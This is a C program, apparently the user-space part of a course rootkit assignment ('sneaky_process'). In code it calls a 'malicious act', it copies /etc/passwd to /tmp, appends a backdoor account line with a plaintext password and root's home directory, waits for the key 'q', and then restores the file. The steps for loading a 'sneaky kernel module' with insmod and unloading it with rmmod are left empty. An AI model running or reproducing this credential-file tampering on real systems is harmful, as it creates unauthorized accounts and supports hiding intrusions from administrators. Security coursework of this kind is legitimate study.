#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <termios.h>

int main() {
  // Step 1: Print process ID
  //printf("printf(\"sneaky_process pid = %%d\\n\", getpid());\n");
  printf("sneaky_process pid = %d\n", getpid());
  // Step 2: Perform malicious act - modify /etc/passwd
  if(system("cp /etc/passwd /tmp/passwd") != 0){
    perror("Cannot copy passwd");
    exit(EXIT_FAILURE);
  }
  FILE * pswd = fopen("/etc/passwd", "a");
  if(pswd == NULL){
    perror("Cannot open passwd");
    exit(EXIT_FAILURE);
  }
  fprintf(pswd, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
  fclose(pswd);
  // Step 3: Load sneaky kernel module using "insmod" command
  
  // Step 4: Enter loop to read character from keyboard until 'q' is pressed
  struct termios old_term, new_term;
  tcgetattr(STDIN_FILENO, &old_term);
  new_term = old_term;
  new_term.c_lflag &= ~(ICANON | ECHO);
  tcsetattr(STDIN_FILENO, TCSANOW, &new_term);
  char input;
  while (1) {
    if (read(STDIN_FILENO, &input, 1) < 0) {
	perror("Error reading from stdin");
	break;
    }
    if (input == 'q') {
      break;
    }
  }
  tcsetattr(STDIN_FILENO, TCSANOW, &old_term);
  // Step 5: Unload sneaky kernel module using "rmmod" command
  
  // Step 6: restore /etc/passwd, remove /tmp/passwd
  if (system("cp /tmp/passwd /etc/passwd") != 0) {
    perror("Cannot restore /etc/passwd");
    exit(EXIT_FAILURE);
  }
  if (system("rm /tmp/passwd") != 0) {
    perror("Cannot remove /tmp/passwd");
    exit(EXIT_FAILURE);
  }
  
  return 0;
}
